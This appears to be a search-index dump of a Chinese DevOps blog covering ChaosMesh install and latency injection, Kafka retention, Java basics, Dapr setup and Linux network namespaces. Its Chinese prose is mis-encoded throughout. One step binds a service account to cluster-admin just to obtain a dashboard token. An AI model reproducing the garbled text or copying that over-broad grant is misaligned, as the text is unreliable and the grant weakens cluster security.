kind: Service metadata: name: web-show labels: app: web-show spec: type: NodePort ports: - name: web targetPort: web-port port: 8081 selector: app: web-show ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:1","tags":["æ··æ²Œå·¥ç¨‹","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-å»¶è¿Ÿæ³¨å…¥æµ‹è¯•","uri":"/post/2777/"},{"categories":["äº‘åŸç”Ÿ"],"content":"2.æŸ¥çœ‹web-showæœåŠ¡ 00805-wt8lrefrvuc.png ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:2","tags":["æ··æ²Œå·¥ç¨‹","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-å»¶è¿Ÿæ³¨å…¥æµ‹è¯•","uri":"/post/2777/"},{"categories":["äº‘åŸç”Ÿ"],"content":"3. å‡†å¤‡æ•…éšœæ³¨å…¥æ¸…å•æ–‡ä»¶ ç»™web-show podæ³¨å…¥1åˆ†é’Ÿçš„30msç½‘ç»œå»¶è¿Ÿ apiVersion: chaos-mesh.org/v1alpha1 kind: NetworkChaos metadata: name: web-show-network-delay spec: # æŒ‡å®šçš„åŠ¨ä½œ,å»¶è¿Ÿ action: delay # æŒ‡å®šç”Ÿæ•ˆçš„èŒƒå›´,å³å¯¹å“ªäº›podè¿›è¡Œæ•…éšœæ³¨å…¥ selector: namespaces: - default labelSelectors: app: web-show # å¯¹selectoré€‰å‡ºçš„podè¿›è¡Œæ›´ç»†ç²’åº¦çš„æ§åˆ¶ mode: one # å¢åŠ 30mså»¶è¿Ÿ delay: latency: 30ms # æ•…éšœæŒç»­æ—¶é—´ duration: 1m oneï¼ˆè¡¨ç¤ºéšæœºé€‰å‡ºä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„ Podï¼‰ allï¼ˆè¡¨ç¤ºé€‰å‡ºæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ Podï¼‰ fixedï¼ˆè¡¨ç¤ºé€‰å‡ºæŒ‡å®šæ•°é‡ä¸”ç¬¦åˆæ¡ä»¶çš„ Podï¼‰ fixed-percentï¼ˆè¡¨ç¤ºé€‰å‡ºå ç¬¦åˆæ¡ä»¶çš„ Pod ä¸­æŒ‡å®šç™¾åˆ†æ¯”çš„ Podï¼‰ random-max-percentï¼ˆè¡¨ç¤ºé€‰å‡ºå ç¬¦åˆæ¡ä»¶çš„ Pod ä¸­ä¸è¶…è¿‡æŒ‡å®šç™¾åˆ†æ¯”çš„ Podï¼‰ ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:3","tags":["æ··æ²Œå·¥ç¨‹","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-å»¶è¿Ÿæ³¨å…¥æµ‹è¯•","uri":"/post/2777/"},{"categories":["äº‘åŸç”Ÿ"],"content":"4.æœ€ç»ˆæ•ˆæœ 86448-cnm9oar8tju.png ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:4","tags":["æ··æ²Œå·¥ç¨‹","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-å»¶è¿Ÿæ³¨å…¥æµ‹è¯•","uri":"/post/2777/"},{"categories":["äº‘åŸç”Ÿ"],"content":"å®éªŒç¯å¢ƒ: k8s v1.21.0 helm v3.1.2 1ã€åˆ›å»ºnamespace kubectl create namespace chaos-mesh 2ã€ç”¨helmç›´æ¥å®‰è£… helm repo add chaos-mesh https://charts.chaos-mesh.org helm repo update # ä½¿ç”¨helmå®‰è£… # docker cri helm install chaos-mesh chaos-mesh/chaos-mesh --version v2.0.0 --namespace chaos-mesh # containerd cri helm install chaos-mesh chaos-mesh/chaos-mesh --version v2.0.0 --namespace chaos-mesh --set chaosDaemon.runtime=containerd --set chaosDaemon.socketPath=/run/containerd/containerd.sock æ¸…å•ç”Ÿæˆ: helm template chaos-mesh chaos-mesh/chaos-mesh â€“version v2.0.0 â€“include-crds â€“namespace chaos-mesh \u003e chaos-mesh.install.yaml 3ã€æŸ¥çœ‹å®‰è£…çš„ç»„ä»¶ kubectl get deploy,ds,pods,svc --namespace chaos-mesh chaos-controller-manager: Chaos Meshçš„æ ¸å¿ƒé€»è¾‘ç»„ä»¶ï¼Œä¸»è¦è´Ÿè´£æ··æ²Œå®éªŒçš„è°ƒåº¦ä¸ç®¡ç†ã€‚è¯¥ç»„ä»¶åŒ…å«å¤šä¸ª CRD Controllerï¼Œä¾‹å¦‚ Workflow Controllerã€Scheduler Controller ä»¥åŠå„ç±»æ•…éšœç±»å‹çš„ Controllerã€‚ chaos-daemon: æ˜¯å…·ä½“æ‰§è¡Œæ•…éšœæ³¨å…¥çš„ç»„ä»¶ï¼Œä»¥daemonsetçš„æ–¹å¼è¿è¡Œ.é»˜è®¤æ‹¥æœ‰Privilegedæƒé™ï¼ˆå¯ä»¥å…³é—­ï¼‰ã€‚è¯¥ç»„ä»¶ä¸»è¦é€šè¿‡ä¾µå…¥ç›®æ ‡ Pod Namespace çš„æ–¹å¼å¹²æ‰°å…·ä½“çš„ç½‘ç»œè®¾å¤‡ã€æ–‡ä»¶ç³»ç»Ÿã€å†…æ ¸ç­‰ã€‚ chaos-dashboard: å¯è§†åŒ–ç»„ä»¶ï¼Œç”¨æˆ·å¯é€šè¿‡è¯¥ç•Œé¢å¯¹æ··æ²Œå®éªŒè¿›è¡Œæ“ä½œå’Œè§‚æµ‹ã€‚åŒæ—¶ï¼ŒChaos Dashboard è¿˜æä¾›äº† RBAC æƒé™ç®¡ç†æœºåˆ¶ã€‚ 4ã€é€šè¿‡nodeportè®¿é—®dashboard 5ã€é…ç½®token # åˆ›å»ºè¶…çº§ç®¡ç†å‘˜è´¦å· k create sa -n chaos-mesh superadmin # ç»‘å®šç®¡ç†å‘˜æƒé™ k create clusterrolebinding --clusterrole=cluster-admin --serviceaccount=chaos-mesh:superadmin superadmin-binding # è·å–ç™»é™†token k get secret -n chaos-mesh $(k get sa -n chaos-mesh superadmin -o jsonpath={.secrets[0].name}) -o jsonpath={.data.token} | base64 -d nameéšä¾¿è¾“å…¥ï¼Œtokenè¾“å…¥æˆ‘ä»¬è·å–çš„ï¼Œç„¶åå°±å¯ä»¥å»dashboardä¸­æ¢ç´¢æ··æ²Œå·¥ç¨‹çš„ä¸–ç•Œäº† ","date":"2021-12-14 17:37","objectID":"/post/2774/:0:0","tags":["æ··æ²Œå·¥ç¨‹","chaos-mesh","chaosmesh"],"title":"ChaosMesh-å®‰è£…","uri":"/post/2774/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ–¹æ³•ä¸€ ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶ log.retention.hours=24 log.cleanup.policy=delete ","date":"2021-12-09 21:06","objectID":"/post/2767/:0:1","tags":["kafka"],"title":"kafkaä¿®æ”¹topicä¸­çš„æ¶ˆæ¯ä¿ç•™æ—¶é—´","uri":"/post/2767/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ–¹æ³•äºŒ ä½¿ç”¨kafkaè„šæœ¬ ./kafka-configs.sh --zookeeper localhost:2181 --alter --entity-name testlog --entity-type topics --add-config retention.ms=86400000 ","date":"2021-12-09 21:06","objectID":"/post/2767/:0:2","tags":["kafka"],"title":"kafkaä¿®æ”¹topicä¸­çš„æ¶ˆæ¯ä¿ç•™æ—¶é—´","uri":"/post/2767/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ–¹æ³•ä¸‰ ä½¿ç”¨kafka-manager 51303-tqyz0z8jibb.png 38008-tno15juopb.png 28708-hz6lb4dfj7n.png ","date":"2021-12-09 21:06","objectID":"/post/2767/:0:3","tags":["kafka"],"title":"kafkaä¿®æ”¹topicä¸­çš„æ¶ˆæ¯ä¿ç•™æ—¶é—´","uri":"/post/2767/"},{"categories":["java"],"content":" staticå¯ä»¥ç”¨æ¥ä¿®é¥°å±æ€§ã€æ–¹æ³•ã€ä»£ç å—(å¯ä»¥ç§°ä¸ºé™æ€å±æ€§ã€é™æ€æ–¹æ³•ã€é™æ€ä»£ç å—) ç±»ä¸­çš„é™æ€å±æ€§æ˜¯æ‰€æœ‰å¯¹è±¡å…±äº«çš„ é™æ€å±æ€§å’Œé™æ€æ–¹æ³•å¯ä»¥ç›´æ¥é€šè¿‡ç±»æ¥è°ƒç”¨(å› ä¸ºå­˜åœ¨jvmå†…å­˜çš„æ–¹æ³•åŒºä¸­ï¼Œè€Œä¸æ˜¯å †ä¸­çš„å¯¹è±¡ä¸­) é™æ€æ–¹æ³•ä¸èƒ½ä½¿ç”¨this é™æ€æ–¹æ³• åªèƒ½è°ƒç”¨é™æ€å±æ€§å’Œé™æ€æ–¹æ³•(å› ä¸ºä»–ä»¬æ˜¯å±äºç±»çš„) ä¸èƒ½è°ƒç”¨æˆå‘˜å±æ€§å’Œæˆå‘˜æ–¹æ³•(å› ä¸ºä»–ä»¬æ˜¯å±äºå¯¹è±¡çš„) é™æ€å±æ€§ éƒ½å¯ä»¥è°ƒç”¨ é™æ€ä»£ç å—åªæœ‰åœ¨ç¬¬ä¸€æ¬¡newçš„æ—¶å€™ä¼šæ‰§è¡Œï¼Œå¹¶ä¸”æ˜¯ä¼˜å…ˆæ‰§è¡Œçš„ã€‚ ","date":"2021-11-20 23:49","objectID":"/post/2754/:0:0","tags":["java"],"title":"java staticå…³é”®å­—","uri":"/post/2754/"},{"categories":["java"],"content":" æ–¹æ³•åå’Œç±»åä¸€è‡´ åªèƒ½ä½¿ç”¨æƒé™ä¿®é¥°ç¬¦ ä¸èƒ½æŒ‡å®šè¿”å›ç±»å‹ å’Œpythonä¸­çš„__init__æ–¹æ³•å·®ä¸å¤š package cn.soulchild.part1; public class StrucTure { int age = 1; static { System.out.println(\"åœ¨ç±»ä¸­å®šä¹‰ç§°ä¸ºé™æ€æ„é€ ä»£ç å—ï¼Œåªæœ‰åœ¨ç¬¬ä¸€æ¬¡newå¯¹è±¡çš„æ—¶å€™æ‰§è¡Œï¼Œæ‰§è¡Œé¡ºåº1\"); } { System.out.println(\"åœ¨ç±»ä¸­å®šä¹‰ç§°ä¸ºæ„é€ ä»£ç å—ï¼Œæ¯æ¬¡newå¯¹è±¡çš„æ—¶å€™æ‰§è¡Œï¼Œæ‰§è¡Œé¡ºåº2\"); } public StrucTure(){ System.out.println(\"æ„é€ æ–¹æ³•ï¼Œæ¯æ¬¡newå¯¹è±¡çš„æ—¶å€™æ‰§è¡Œï¼Œæ‰§è¡Œé¡ºåº3\"); } public void print() { System.out.println(age); } } ","date":"2021-11-20 21:55","objectID":"/post/2753/:0:0","tags":["java"],"title":"javaæ„é€ æ–¹æ³•","uri":"/post/2753/"},{"categories":["å…¶ä»–"],"content":"å®‰è£…dapr-cli wget https://github.91chifun.workers.dev/https://github.com//dapr/cli/releases/download/v1.5.0/dapr_linux_amd64.tar.gz tar xf dapr_linux_amd64.tar.gz mv dapr /usr/local/bin/ åœ¨kubernetesä¸­å®‰è£…dapr dapr init -k --enable-mtls=false ","date":"2021-11-16 19:47","objectID":"/post/2751/:0:0","tags":["k8s"],"title":"Daprå®‰è£…è®°å½•","uri":"/post/2751/"},{"categories":["å…¶ä»–","è™šæ‹ŸåŒ–"],"content":"ä¸€ã€åŸºæœ¬å‘½ä»¤ # åˆ›å»ºns ip netns add newns # åˆ é™¤ns ip netns delete newns # æŸ¥çœ‹ns ip netns ls # åœ¨æŒ‡å®šçš„nsä¸­æ‰§è¡Œå‘½ä»¤ ip netns exec newns ip # è¿›å…¥æŒ‡å®šnsçš„shell ip netns exec newns bash -rcfile \u003c(echo \"PS1='newns \u003e '\") # ä¿®æ”¹ç½‘å¡å ip netns exec newns ip link set dev ç½‘å¡å name æ–°ç½‘å¡å # å¯åŠ¨ç½‘å¡ ip link set dev lo up # åˆ›å»ºvethè®¾å¤‡ ip link add ç½‘å¡å1 type veth peer name ç½‘å¡å2 # å°†peer1ç½‘å¡åˆ†é…åˆ°æŒ‡å®šçš„nsä¸­ ip link set ç½‘å¡å netns nså # åˆ›å»ºç½‘æ¡¥ ip link add ç½‘å¡å type bridge # ä¸ºç½‘å¡é…ç½®ip ip addr add dev ç½‘å¡å 192.168.1.10/24 # å°†ç½‘å¡æ¡¥æ¥åˆ°ç½‘æ¡¥ç½‘å¡ä¸­ ip link set ç½‘å¡å master ç½‘æ¡¥ç½‘å¡å # æŸ¥çœ‹æ¡¥æ¥è®¾å¤‡ brctl show ","date":"2021-11-07 20:50","objectID":"/post/2745/:0:1","tags":["linux"],"title":"ipå‘½ä»¤ç®¡ç†Network Namespaceç›¸å…³æ“ä½œ","uri":"/post/2745/"},{"categories":["å…¶ä»–","è™šæ‹ŸåŒ–"],"content":"äºŒã€å®ç°ä¸¤ä¸ªnamespaceçš„é€šä¿¡ 1.åˆ›å»ºä¸¤ä¸ªns ip netns add ns1 ip netns add ns2 2.åˆ›å»ºä¸€å¯¹vethç½‘å¡è®¾å¤‡(æ¯å¯¹vethè®¾å¤‡éƒ½æ˜¯äº’ç›¸è¿é€šçš„) # åˆ›å»ºns1ç½‘å¡ï¼Œç±»å‹ä¸ºvethå¯¹ç­‰è®¾å¤‡ï¼Œå¯¹ç­‰è®¾å¤‡çš„åç§°æ˜¯ns2 ip link add ns1 type veth peer name ns2 é€šè¿‡ethtool -S vethè®¾å¤‡å å¯ä»¥æŸ¥çœ‹åˆ°ç½‘å¡ç´¢å¼•ï¼Œé€šè¿‡ip a |grep '^ç´¢å¼•'å¯ä»¥çœ‹åˆ°ç½‘å¡ä¿¡æ¯ã€‚ ä½¿ç”¨ip aå¯ä»¥çœ‹åˆ°ns2@ns1å’Œns1@ns2ä¸¤ä¸ªç½‘å¡è®¾å¤‡ 3.åˆ†é…vethè®¾å¤‡åˆ°ä¸åŒçš„namespace # å‰é¢çš„ns1æ˜¯ç½‘å¡å,åé¢çš„ns1æ˜¯namespaceåç§° ip link set ns1 netns ns1 ip link set ns2 netns ns2 æ³¨æ„: åˆ†é…ååœ¨é»˜è®¤çš„network namespaceä¸­å°±çœ‹ä¸åˆ°æˆ‘ä»¬åˆ›å»ºçš„ä¸€å¯¹vethç½‘å¡è®¾å¤‡äº†,å› ä¸ºä»–ä»¬å·²ç»è¢«åˆ†é…åˆ°å…¶ä»–çš„namespaceä¸­ 4.ä¸ºä¸¤ä¸ªnamespaceçš„vethç½‘å¡è®¾ç½®ipå¹¶å¯åŠ¨ç½‘å¡ # è®¾ç½®ip ip netns exec ns1 ip addr add dev ns1 192.168.1.10/24 ip netns exec ns2 ip addr add dev ns2 192.168.1.11/24 # å¯åŠ¨ç½‘å¡ ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set ns1 up ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set ns2 up 5.pingæµ‹è¯• # ns1 ping ns2 ip netns exec ns1 ping 192.168.1.11 # ns2 ping ns1 ip netns exec ns2 ping 192.168.1.10 ","date":"2021-11-07 20:50","objectID":"/post/2745/:0:2","tags":["linux"],"title":"ipå‘½ä»¤ç®¡ç†Network Namespaceç›¸å…³æ“ä½œ","uri":"/post/2745/"},{"categories":["å…¶ä»–","è™šæ‹ŸåŒ–"],"content":"ä¸‰ã€æ¨¡æ‹Ÿdockerä½¿ç”¨ç½‘æ¡¥å®ç°ä¸åŒnamespaceçš„é€šä¿¡ 1.åˆ›å»ºä¸¤ä¸ªns ip netns add ns3 ip netns add ns4 2.åˆ›å»ºbridgeç±»å‹çš„ç½‘å¡(ç½‘æ¡¥ç›¸å½“äºäº¤æ¢æœº) ip link add mydocker0 type bridge 3.åˆ›å»ºã€åˆ†é…ã€æ¡¥æ¥vethè®¾å¤‡ # åˆ›å»ºvethè®¾å¤‡(ä¸€ç«¯æ”¾åœ¨ns3é‡Œï¼Œå¦ä¸€ç«¯å’Œmydocker0æ¡¥æ¥) ip link add ns3 type veth peer name ns3tomydocker0 # åˆ†é…å…¶ä¸­ä¸€å—vethè®¾å¤‡åˆ°ns3ä¸­ ip link set ns3 netns ns3 # å°†å¦ä¸€å—vethè®¾å¤‡æ¡¥æ¥åˆ°mydocker0ä¸­ ip link set ns3tomydocker0 master mydocker0 åŒç†ä¹Ÿéœ€è¦ä¸ºns4åšåŒæ ·çš„æ“ä½œ # åˆ›å»ºvethè®¾å¤‡(ä¸€ç«¯æ”¾åœ¨ns4é‡Œï¼Œå¦ä¸€ç«¯å’Œmydocker0æ¡¥æ¥) ip link add ns4 type veth peer name ns4tomydocker0 # åˆ†é…å…¶ä¸­ä¸€å—vethè®¾å¤‡åˆ°ns4ä¸­ ip link set ns4 netns ns4 # å°†å¦ä¸€å—vethè®¾å¤‡æ¡¥æ¥åˆ°mydocker0ä¸­ ip link set ns4tomydocker0 master mydocker0 é€šè¿‡bridge linkå¯ä»¥æŸ¥çœ‹æ¡¥æ¥çŠ¶æ€ 4.ä¸ºä¸¤ä¸ªnamespaceçš„vethç½‘å¡è®¾ç½®ipå¹¶å¯åŠ¨ç½‘å¡ # ä¸ºns3å’Œns4ä¸­çš„ç½‘å¡è®¾ç½®ip ip netns exec ns3 ip addr add dev ns3 192.168.2.10/24 ip netns exec ns4 ip addr add dev ns4 192.168.2.11/24 # å¯åŠ¨ns3å’Œns4ä¸­çš„ç½‘å¡ ip netns exec ns3 ip link set lo up ip netns exec ns3 ip link set ns3 up ip netns exec ns4 ip link set lo up ip netns exec ns4 ip link set ns4 up # å¯åŠ¨ns3å’Œns4å¯¹ç«¯çš„ç½‘å¡ ip link set ns3tomydocker0 up ip link set ns4tomydocker0 up 5.å¯åŠ¨mydocker0ç½‘æ¡¥ ip link set mydocker0 up 6.pingæµ‹è¯• ip netns exec ns3 ping 192.168.2.11 ip netns exec ns4 ping 192.168.2.10 ä¸Šé¢çš„é…ç½®ä¸èƒ½è®©nså†…éƒ¨è®¿é—®å¤–ç½‘,è¦è®¿é—®å¤–ç½‘éœ€è¦ç»™mydocker0é…ç½®ipåœ°å€ï¼Œnså†…éƒ¨é…ç½®è·¯ç”±è§„åˆ™æŒ‡å‘mydocker0,åœ¨å®¿ä¸»æœºæ·»åŠ iptables snat. æ“ä½œå¦‚ä¸‹ # ç»™docker0é…ç½®IP ip addr add dev mydocker0 192.168.2.1/24 # é…ç½®ns3ã€ns4çš„é»˜è®¤ç½‘å…³ä¸ºdocker0 ip netns exec ns3 route add -net default gw 192.168.2.1 ip netns exec ns4 route add -net default gw 192.168.2.1 # é…ç½®SNATï¼Œè®¿é—®å¤–éƒ¨ç½‘ç»œ iptables -t nat -I POSTROUTING -s 192.168.2.0/24 -j MASQUERADE # é…ç½®DNS mkdir -p /etc/netns/ns3 \u0026\u0026 echo \"nameserver 223.5.5.5\" | tee -a /etc/netns/ns3/resolv.conf mkdir -p /etc/netns/ns4 \u0026\u0026 echo \"nameserver 223.5.5.5\" | tee -a /etc/netns/ns4/resolv.conf ","date":"2021-11-07 20:50","objectID":"/post/2745/:0:3","tags":["linux"],"title":"ipå‘½ä»¤ç®¡ç†Network Namespaceç›¸å…³æ“ä½œ","uri":"/post/2745/"},{"categories":["åŸºç¡€å†…å®¹","docker","kubernetes"],"content":"ä½œè€…: é…·å£³â€“CoolShell åŸæ–‡: https://coolshell.cn/articles/17029.html Networkçš„Namespaceæ¯”è¾ƒå•°å—¦ã€‚åœ¨Linuxä¸‹ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨ipå‘½ä»¤åˆ›å»ºNetwork Namespaceï¼ˆDockerçš„æºç ä¸­ï¼Œå®ƒæ²¡æœ‰ç”¨ipå‘½ä»¤ï¼Œè€Œæ˜¯è‡ªå·±å®ç°äº†ipå‘½ä»¤å†…çš„ä¸€äº›åŠŸèƒ½â€”â€”æ˜¯ç”¨äº†Raw Socketå‘äº›â€œå¥‡æ€ªâ€çš„æ•°æ®ï¼Œå‘µå‘µï¼‰ã€‚è¿™é‡Œï¼Œæˆ‘è¿˜æ˜¯ç”¨ipå‘½ä»¤è®²è§£ä¸€ä¸‹ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸ªå›¾ï¼Œä¸‹é¢è¿™ä¸ªå›¾åŸºæœ¬ä¸Šå°±æ˜¯Dockeråœ¨å®¿ä¸»æœºä¸Šçš„ç½‘ç»œç¤ºæ„å›¾ï¼ˆå…¶ä¸­çš„ç‰©ç†ç½‘å¡å¹¶ä¸å‡†ç¡®ï¼Œå› ä¸ºdockerå¯èƒ½ä¼šè¿è¡Œåœ¨ä¸€ä¸ªVMä¸­ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œæ‰€è°“çš„â€œç‰©ç†ç½‘å¡â€å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªæœ‰å¯ä»¥è·¯ç”±çš„IPçš„ç½‘å¡ï¼‰ 69395-esxyvv0vnym.png ä¸Šå›¾ä¸­ï¼ŒDockerä½¿ç”¨äº†ä¸€ä¸ªç§æœ‰ç½‘æ®µï¼Œ172.40.1.0ï¼Œdockerè¿˜å¯èƒ½ä¼šä½¿ç”¨10.0.0.0å’Œ192.168.0.0è¿™ä¸¤ä¸ªç§æœ‰ç½‘æ®µï¼Œå…³é”®çœ‹ä½ çš„è·¯ç”±è¡¨ä¸­æ˜¯å¦é…ç½®äº†ï¼Œå¦‚æœæ²¡æœ‰é…ç½®ï¼Œå°±ä¼šä½¿ç”¨ï¼Œå¦‚æœä½ çš„è·¯ç”±è¡¨é…ç½®äº†æ‰€æœ‰ç§æœ‰ç½‘æ®µï¼Œé‚£ä¹ˆdockerå¯åŠ¨æ—¶å°±ä¼šå‡ºé”™äº†ã€‚ å½“ä½ å¯åŠ¨ä¸€ä¸ªDockerå®¹å™¨åï¼Œä½ å¯ä»¥ä½¿ç”¨ip link showæˆ–ip addr showæ¥æŸ¥çœ‹å½“å‰å®¿ä¸»æœºçš„ç½‘ç»œæƒ…å†µï¼ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªdocker0ï¼Œè¿˜æœ‰ä¸€ä¸ªveth22a38e6çš„è™šæ‹Ÿç½‘å¡â€”â€”ç»™å®¹å™¨ç”¨çš„ï¼‰ï¼š hchen@ubuntu:~$ ip link show 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state ... link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: eth0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc ... link/ether 00:0c:29:b7:67:7d brd ff:ff:ff:ff:ff:ff 3: docker0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 ... link/ether 56:84:7a:fe:97:99 brd ff:ff:ff:ff:ff:ff 5: veth22a38e6: \u003cBROADCAST,UP,LOWER_UP\u003e mtu 1500 qdisc ... link/ether 8e:30:2a:ac:8c:d1 brd ff:ff:ff:ff:ff:ff é‚£ä¹ˆï¼Œè¦åšæˆè¿™ä¸ªæ ·å­åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸€ç»„å‘½ä»¤ï¼š ## é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆå¢åŠ ä¸€ä¸ªç½‘æ¡¥lxcbr0ï¼Œæ¨¡ä»¿docker0 brctl addbr lxcbr0 brctl stp lxcbr0 off ifconfig lxcbr0 192.168.10.1/24 up #ä¸ºç½‘æ¡¥è®¾ç½®IPåœ°å€ ## æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªnetwork namespace - ns1 # å¢åŠ ä¸€ä¸ªnamesapce å‘½ä»¤ä¸º ns1 ï¼ˆä½¿ç”¨ip netns addå‘½ä»¤ï¼‰ ip netns add ns1 # æ¿€æ´»namespaceä¸­çš„loopbackï¼Œå³127.0.0.1ï¼ˆä½¿ç”¨ip netns exec ns1æ¥æ“ä½œns1ä¸­çš„å‘½ä»¤ï¼‰ ip netns exec ns1 ip link set dev lo up ## ç„¶åï¼Œæˆ‘ä»¬éœ€è¦å¢åŠ ä¸€å¯¹è™šæ‹Ÿç½‘å¡ # å¢åŠ ä¸€ä¸ªpairè™šæ‹Ÿç½‘å¡ï¼Œæ³¨æ„å…¶ä¸­çš„vethç±»å‹ï¼Œå…¶ä¸­ä¸€ä¸ªç½‘å¡è¦æŒ‰è¿›å®¹å™¨ä¸­ ip link add veth-ns1 type veth peer name lxcbr0.1 # æŠŠ veth-ns1 æŒ‰åˆ°namespace ns1ä¸­ï¼Œè¿™æ ·å®¹å™¨ä¸­å°±ä¼šæœ‰ä¸€ä¸ªæ–°çš„ç½‘å¡äº† ip link set veth-ns1 netns ns1 # æŠŠå®¹å™¨é‡Œçš„ veth-ns1æ”¹åä¸º eth0 ï¼ˆå®¹å™¨å¤–ä¼šå†²çªï¼Œå®¹å™¨å†…å°±ä¸ä¼šäº†ï¼‰ ip netns exec ns1 ip link set dev veth-ns1 name eth0 # ä¸ºå®¹å™¨ä¸­çš„ç½‘å¡åˆ†é…ä¸€ä¸ªIPåœ°å€ï¼Œå¹¶æ¿€æ´»å®ƒ ip netns exec ns1 ifconfig eth0 192.168.10.11/24 up # ä¸Šé¢æˆ‘ä»¬æŠŠveth-ns1è¿™ä¸ªç½‘å¡æŒ‰åˆ°äº†å®¹å™¨ä¸­ï¼Œç„¶åæˆ‘ä»¬è¦æŠŠlxcbr0.1æ·»åŠ ä¸Šç½‘æ¡¥ä¸Š brctl addif lxcbr0 lxcbr0.1 # ä¸ºå®¹å™¨å¢åŠ ä¸€ä¸ªè·¯ç”±è§„åˆ™ï¼Œè®©å®¹å™¨å¯ä»¥è®¿é—®å¤–é¢çš„ç½‘ç»œ ip netns exec ns1 ip route add default via 192.168.10.1 # åœ¨/etc/netnsä¸‹åˆ›å»ºnetwork namespceåç§°ä¸ºns1çš„ç›®å½•ï¼Œ # ç„¶åä¸ºè¿™ä¸ªnamespaceè®¾ç½®resolv.confï¼Œè¿™æ ·ï¼Œå®¹å™¨å†…å°±å¯ä»¥è®¿é—®åŸŸåäº† mkdir -p /etc/netns/ns1 echo \"nameserver 8.8.8.8\" \u003e /etc/netns/ns1/resolv.conf ä¸Šé¢åŸºæœ¬ä¸Šå°±æ˜¯dockerç½‘ç»œçš„åŸç†äº†ï¼Œåªä¸è¿‡ï¼Œ Dockerçš„resolv.confæ²¡æœ‰ç”¨è¿™æ ·çš„æ–¹å¼ï¼Œè€Œæ˜¯ç”¨äº†ä¸Šç¯‡ä¸­çš„Mount Namesapceçš„é‚£ç§æ–¹å¼ å¦å¤–ï¼Œdockeræ˜¯ç”¨è¿›ç¨‹çš„PIDæ¥åšNetwork Namespaceçš„åç§°çš„ã€‚ äº†è§£äº†è¿™äº›åï¼Œä½ ç”šè‡³å¯ä»¥ä¸ºæ­£åœ¨è¿è¡Œçš„dockerå®¹å™¨å¢åŠ ä¸€ä¸ªæ–°çš„ç½‘å¡ï¼š ip link add peerA type veth peer name peerB brctl addif docker0 peerA ip link set peerA up ip link set peerB netns ${container-pid} ip netns exec ${container-pid} ip link set dev peerB name eth1 ip netns exec ${container-pid} ip link set eth1 up ; ip netns exec ${container-pid} ip addr add ${ROUTEABLE_IP} dev eth1 ; ä¸Šé¢çš„ç¤ºä¾‹æ˜¯æˆ‘ä»¬ä¸ºæ­£åœ¨è¿è¡Œçš„dockerå®¹å™¨ï¼Œå¢åŠ ä¸€ä¸ªeth1çš„ç½‘å¡ï¼Œå¹¶ç»™äº†ä¸€ä¸ªé™æ€çš„å¯è¢«å¤–éƒ¨è®¿é—®åˆ°çš„IPåœ°å€ã€‚ è¿™ä¸ªéœ€è¦æŠŠå¤–éƒ¨çš„â€œç‰©ç†ç½‘å¡â€é…ç½®æˆæ··æ‚æ¨¡å¼ï¼Œè¿™æ ·è¿™ä¸ªeth1ç½‘å¡å°±ä¼šå‘å¤–é€šè¿‡ARPåè®®å‘é€è‡ªå·±çš„Macåœ°å€ï¼Œç„¶åå¤–éƒ¨çš„äº¤æ¢æœºå°±ä¼šæŠŠåˆ°è¿™ä¸ªIPåœ°å€çš„åŒ…è½¬åˆ°â€œç‰©ç†ç½‘å¡â€ä¸Šï¼Œå› ä¸ºæ˜¯æ··æ‚æ¨¡å¼ï¼Œæ‰€ä»¥eth1å°±èƒ½æ”¶åˆ°ç›¸å…³çš„æ•°æ®ï¼Œä¸€çœ‹ï¼Œæ˜¯è‡ªå·±çš„ï¼Œé‚£ä¹ˆå°±æ”¶åˆ°ã€‚è¿™æ ·ï¼ŒDockerå®¹å™¨çš„ç½‘ç»œå°±å’Œå¤–éƒ¨é€šäº†ã€‚ å½“ç„¶ï¼Œæ— è®ºæ˜¯Dockerçš„NATæ–¹å¼ï¼Œè¿˜æ˜¯æ··æ‚æ¨¡å¼éƒ½ä¼šæœ‰æ€§èƒ½ä¸Šçš„é—®é¢˜ï¼ŒNATä¸ç”¨è¯´äº†ï¼Œå­˜åœ¨ä¸€ä¸ªè½¬å‘çš„å¼€é”€ï¼Œæ··æ‚æ¨¡å¼å‘¢ï¼Œç½‘å¡ä¸Šæ”¶åˆ°çš„è´Ÿè½½éƒ½ä¼šå®Œå…¨äº¤ç»™æ‰€æœ‰çš„è™šæ‹Ÿç½‘å¡ä¸Šï¼Œäºæ˜¯å°±ç®—ä¸€ä¸ªç½‘å¡ä¸Šæ²¡æœ‰æ•°æ®ï¼Œä½†ä¹Ÿä¼šè¢«å…¶å®ƒç½‘å¡ä¸Šçš„æ•°æ®æ‰€å½±å“ã€‚ 